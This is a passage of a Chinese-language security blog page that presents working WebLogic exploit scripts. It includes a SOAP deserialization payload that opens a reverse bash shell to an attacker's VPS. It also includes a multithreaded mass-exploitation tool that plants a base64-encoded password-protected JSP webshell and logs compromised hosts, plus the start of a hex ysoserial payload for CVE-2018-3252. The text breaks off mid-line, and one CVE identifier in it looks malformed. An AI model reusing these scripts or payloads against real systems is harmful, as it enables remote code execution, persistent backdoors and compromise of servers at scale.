class="line">17</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">          &lt;void index&#x3D;&quot;1&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">          &lt;string&gt;-c&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">          &lt;void index&#x3D;&quot;2&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">          &lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;%s 0&gt;&amp;1&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;array&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">          &lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;work:WorkContext&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;soapenv:Header&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">          &lt;soapenv:Body&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">          &lt;asy:onAsyncDelivery&#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">          &lt;&#x2F;soapenv:Body&gt;&lt;&#x2F;soapenv:Envelope&gt;&#39;&#39;&#39;  % (sys.argv[2],sys.argv[3])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">          print url</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">          header &#x3D; &#123;&#39;content-type&#39;: &#39;text&#x2F;xml&#39;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">          r&#x3D;requests.post(url,headers&#x3D;header,data&#x3D;raw)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">          if (r.status_code&#x3D;&#x3D;202):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">              print &quot;反弹成功！&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">          else :</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">              print&quot;漏洞不存在！&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">      except:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">          print &quot;使用方法：VPS监听端口 weblogic.py 目标网址 VPSip 端口&quot;</span></pre></td></tr></table></figure><h2 id="批量"><a href="#批量" class="headerlink" title="批量"></a>批量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import gevent</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">from gevent import  monkey;monkey.patch_all()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">import os</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">from multiprocessing import Process</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">class Weblogic:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    def __init__(self,headers,data,path):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        self.headers&#x3D;headers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        self.data&#x3D;data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        self.path&#x3D;path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    def exploit(self,url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        urls&#x3D;&#39;&#123;&#125;&#123;&#125;&#39;.format(str(url).rstrip(&#39;&#x2F;&#39;).strip(),self.path)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        urls2&#x3D;&#39;&#123;&#125;&#123;&#125;&#39;.format(str(url).rstrip(&#39;&#x2F;&#39;).strip(),&#39;&#x2F;_async&#x2F;webshells.jsp&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            rqt&#x3D;requests.get(url&#x3D;urls,headers&#x3D;self.headers)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">            if rqt.status_code&#x3D;&#x3D;200 and &#39;Test page&#39; in rqt.text:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">                rvt&#x3D;requests.post(url&#x3D;urls,headers&#x3D;self.headers,data&#x3D;self.data,timeout&#x3D;3)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">                if rvt.status_code&#x3D;&#x3D;202:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">                    rbt&#x3D;requests.get(url&#x3D;urls2,headers&#x3D;headers)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">                    if rbt.status_code&#x3D;&#x3D;200 and not &#39;404&#39; in rbt.text:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">                        print(&#39;[+] weblogic反序列化漏洞利用成功,ip:&#123;&#125; password:&#123;&#125; 利用方式如:&#123;&#125;&#39;.format(urls2,&#39;123&#39;,&#39;&#123;&#125;?pwd&#x3D;123&amp;cmd&#x3D;whoami&#39;.format(urls2)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">                        print(&#39;[+] weblogic反序列化漏洞利用成功,ip:&#123;&#125; password:&#123;&#125; 利用方式如:&#123;&#125;&#39;.format(urls2, &#39;123&#39;,&#39;&#123;&#125;?pwd&#x3D;123&amp;cmd&#x3D;whoami&#39;.format(urls2)),file&#x3D;open(&#39;save.txt&#39;,&#39;a&#39;,encoding&#x3D;&#39;utf-8&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">                    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">                        print(&#39;[-] 利用失败 url:&#123;&#125; 状态码:&#123;&#125;&#39;.format(rbt.url,rbt.status_code))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">                else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">                    print(&#39;[-] 利用失败 url:&#123;&#125; 状态码:&#123;&#125;&#39;.format(rvt.url,rvt.status_code))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">                print(&#39;[-] 不存在weblogic反序列化漏洞-CVE-2019-48814 http状态码:&#123;&#125; url:&#123;&#125;&#39;.format(rqt.status_code,urls))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">        except:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">            pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">    def xc(self,rw):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">        xs&#x3D;[]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">        for r in rw:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">            xs.append(gevent.spawn(self.exploit,r))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">        gevent.joinall(xs)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    def djc(self,id):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">        url_list&#x3D;[]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">        calc&#x3D;0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">        if str(id)&#x3D;&#x3D;&#39;1&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">            print(&#39;[+] 单个url检测&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">            xw&#x3D;input(&#39;url&gt;&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">            self.exploit(url&#x3D;xw)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">        elif str(id)&#x3D;&#x3D;&#39;2&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">            print(&#39;[+] 批量检测&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">            xw&#x3D;input(r&#39;文件路径&gt;&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">            if os.path.exists(xw):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">                print(&#39;[+] 找到对应的文件&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">                with open(xw,&#39;r&#39;,encoding&#x3D;&#39;utf-8&#39;) as x:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">                    calc+&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">                    if calc&#x3D;&#x3D;100:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">                        p&#x3D;Process(target&#x3D;self.xc,args&#x3D;(url_list,))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">                        p.start()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">                        calc&#x3D;0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">                        url_list.clear()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">                    for r in x.readlines():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">                        qc&#x3D;&quot;&quot;.join(r.split(&#39;\n&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">                        url_list.append(qc)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">                if len(url_list)&gt;0:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">                    b &#x3D; Process(target&#x3D;self.xc, args&#x3D;(url_list,))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">                    b.start()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">            else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">                print(&#39;[-] 找不到对应的文件&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">                exit()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">    headers&#x3D;&#123;&#39;user-agent&#39;:&#39;Apache-HttpClient&#x2F;4.1.1 (java 1.5)&#39;,&#39;Connection&#39;:&#39;keep-alive&#39;,&#39;content-type&#39;: &#39;text&#x2F;xml&#39;,&#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">    path&#x3D;&#39;&#x2F;_async&#x2F;AsyncResponseService&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">    data&#x3D;&quot;&quot;&quot;&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:wsa&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;08&#x2F;addressing&quot; xmlns:asy&#x3D;&quot;http:&#x2F;&#x2F;www.bea.com&#x2F;async&#x2F;AsyncResponseService&quot;&gt;   </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Header&gt; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">&lt;wsa:Action&gt;xx&lt;&#x2F;wsa:Action&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;&#x2F;wsa:RelatesTo&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4&#x3D; |base64 -d &gt; servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls9_async_response&#x2F;8tpkys&#x2F;war&#x2F;webshells.jsp&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;array&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">93</span></pre></td><td class="code"><pre><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">94</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;work:WorkContext&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">95</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;soapenv:Header&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">96</span></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Body&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">97</span></pre></td><td class="code"><pre><span class="line">&lt;asy:onAsyncDelivery&#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">98</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;soapenv:Body&gt;&lt;&#x2F;soapenv:Envelope&gt;&quot;&quot;&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">99</span></pre></td><td class="code"><pre><span class="line">    obj&#x3D;Weblogic(headers&#x3D;headers,data&#x3D;data,path&#x3D;path)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">100</span></pre></td><td class="code"><pre><span class="line">    obj.djc(sys.argv[1])</span></pre></td></tr></table></figure><h1 id="CVE-2018-3252"><a href="#CVE-2018-3252" class="headerlink" title="CVE-2018-3252"></a>CVE-2018-3252</h1><h2 id="version-4"><a href="#version-4" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">10.3.6.0版本，</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">12.1.3.0版本，</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">12.2.1.3版本</span></pre></td></tr></table></figure><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>需要账号密码。防止部署war包容易被发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">import re</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">def payload_module():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    #calc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    #payload &#x3D; &quot;737200176A6176612E7574696C2E4C696E6B656448617368536574D86CD75A95DD2A1E02000077020000787200116A6176612E7574696C2E48617368536574BA44859596B8B734030000770200007870770C000000103F400000000000027372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000849000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785A00155F75736553657276696365734D656368616E69736D4C000B5F617578436C617373657374003B4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F486173687461626C653B5B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D657400124C6A6176612F6C616E672F537472696E673B4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B77020000787000000000FFFFFFFF0070757200035B5B424BFD19156767DB3702000077020000787000000002757200025B42ACF317F8060854E00200007702000078700000069ACAFEBABE0000003200390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E01000863616C632E65786508003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B003401000D537461636B4D61705461626C6501001C79736F73657269616C2F50776E65723132353836353535383033373001001E4C79736F73657269616C2F50776E6572313235383635353538303337303B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002E000E0000000C000100000005000F003800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000033000E00000020000300000001000F0038000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000037000E0000002A000400000001000F003800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B1000000010036000000030001030002002000000002002100110000000A000100020023001000097571007E000C000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003B000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078737D00000001001D6A617661782E786D6C2E7472616E73666F726D2E54656D706C6174657377020000787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B7702000078707372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B770200007870737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C647702000078703F4000000000000C77080000001000000001740008663561356136303871007E0009787672001D6A617661782E786D6C2E7472616E73666F726D2E54656D706C61746573000000000000000000000077020000787078&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    whoami</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; 